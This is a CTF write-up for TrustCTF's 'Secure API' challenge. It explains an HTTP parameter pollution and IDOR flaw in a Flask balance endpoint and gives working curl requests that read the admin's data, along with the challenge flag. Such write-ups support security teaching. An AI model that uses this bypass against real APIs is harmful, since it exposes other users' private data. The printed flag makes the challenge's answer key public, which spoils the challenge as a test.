# Secure API - CTF Challenge Writeup

**Challenge Name:** Secure API  
**CTF:** TrustCTF  
**Category:** API Security  
**Flag:** `trustctf{1n53cur3_0bj3c7_r3f3r3nc3_f7w}`

---

## Challenge Overview

This challenge presents a Flask REST API with user registration, login, and balance checking functionality. The admin user has a balance of 10,000 and possesses the flag, which is revealed when querying a user with balance ≥ 10,000. Normal users start with only 100 balance. The goal is to exploit a vulnerability to access the admin's balance and retrieve the flag.

**Challenge URL:** `https://tlctf2025-api.chals.io`

---

## Initial Analysis

### Step 1: Reconnaissance

The provided source code (`app-public.py`) reveals a Flask API with SQLite backend implementing three endpoints:

```bash
# Available endpoints
POST /api/register  # Create new user account
POST /api/login     # Login and receive bearer token
GET  /api/balance   # Check user balance (requires auth)
```

### Step 2: Examining the Balance Endpoint

The `/api/balance` endpoint is the critical endpoint. Reading the source code reveals:

```python
@app.route('/api/balance', methods=['GET'])
def balance():
    auth = request.headers.get('Authorization', '')
    token = None
    if auth.startswith('Bearer '):
        token = auth.split(None, 1)[1]
    
    auth_user = username_for_token(token) if token else None
    
    target = request.args.get('username')  # Gets FIRST parameter
    db = get_db()

    if target and target != auth_user:
        return jsonify({'error': 'unauthorized'}), 403

    query_target = request.args.getlist('username')  # Gets ALL parameters
    if query_target:
        actual_target = query_target[-1]  # Uses LAST parameter
        cur = db.execute('SELECT username, balance FROM users WHERE username = ?', (actual_target,))
    # ... rest of code
```

**Critical observation:** The authorization check uses `request.args.get('username')` (returns first parameter) but the database query uses `request.args.getlist('username')[-1]` (uses last parameter)!

![Code showing the vulnerability](assets/secure_api/vulnerable_code.png)
*TODO: Add screenshot highlighting the vulnerable code section*

---

## Analysis and Discovery

### Step 3: Identifying HTTP Parameter Pollution (HPP)

This is a textbook case of **HTTP Parameter Pollution** combined with **IDOR (Insecure Direct Object Reference)**.

The vulnerability flow:
1. Authorization check: Uses **first** `username` parameter → checks if user is authorized
2. Database query: Uses **last** `username` parameter → fetches actual data

**Attack vector:** Supply `?username=myuser&username=admin`
- First parameter `myuser` passes authorization check
- Last parameter `admin` is used in database query
- Result: We can read admin's data while bypassing authorization!

### Step 4: Understanding the Flag Condition

The flag is revealed when querying a user with balance ≥ 10,000:

```python
resp = {'username': row['username'], 'balance': row['balance']}
if row['balance'] >= 10000:
    resp['flag'] = 'trustctf{REDACTED}'
return jsonify(resp)
```

Admin starts with 10,000 balance, so querying admin's balance will reveal the flag.

---

## Exploitation

### Step 5: Creating a Valid User Account

First, we need a legitimate account to get a valid bearer token:

```bash
# Register a new user
curl -X POST https://tlctf2025-api.chals.io/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"arnavtest999","password":"pass123"}'
```

**Response:**
```json
{"ok": true}
```


### Step 6: Obtaining Authentication Token

Login to receive a bearer token:

```bash
# Login to get token
curl -X POST https://tlctf2025-api.chals.io/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"arnavtest999","password":"pass123"}'
```

**Response:**
```json
{"token": "34e71813-cf02-4689-8bc8-357b816c0d15"}
```


### Step 7: Exploiting Parameter Pollution to Get the Flag

Now we exploit the vulnerability using two `username` parameters:

```bash
# Exploit: Use our username first (passes auth check), admin second (used in query)
curl "https://tlctf2025-api.chals.io/api/balance?username=arnavtest999&username=admin" \
  -H "Authorization: Bearer 34e71813-cf02-4689-8bc8-357b816c0d15"
```

**Response:**
```json
{
    "balance": 10000,
    "flag": "trustctf{1n53cur3_0bj3c7_r3f3r3nc3_f7w}",
    "username": "admin"
}
```

![Flag successfully retrieved](assets/secure_api/image.png)

**Flag obtained!**

---

## Solution Summary

**Vulnerability Type:** HTTP Parameter Pollution (HPP) + IDOR  
**Root Cause:** Inconsistent parameter extraction (`get()` vs `getlist()[-1]`)  
**Exploit Method:** Supply duplicate `username` parameters to bypass authorization while querying different user  
**Flag:** `trustctf{1n53cur3_0bj3c7_r3f3r3nc3_f7w}`

---


## Tools Used

- **curl** - API testing and exploitation
- **Python 3** - JSON parsing and response handling
- **bash** - Scripting the exploitation workflow

---

## Files

- `app-public.py` - Vulnerable Flask API source code (provided)
- `description.md` - Challenge description and URL
- `exploit.sh` - Automated bash script to exploit the vulnerability and capture the flag


## What Makes This API Vulnerable

The vulnerability stems from **inconsistent parameter extraction** in security-critical code:

```python
# Authorization check uses first parameter
target = request.args.get('username')  
if target and target != auth_user:
    return jsonify({'error': 'unauthorized'}), 403

# Database query uses last parameter  
query_target = request.args.getlist('username')
if query_target:
    actual_target = query_target[-1]  # DIFFERENT PARAMETER!
```

This allows an attacker to:
1. Pass authorization by providing their own username first
2. Query a different user's data by providing target username second
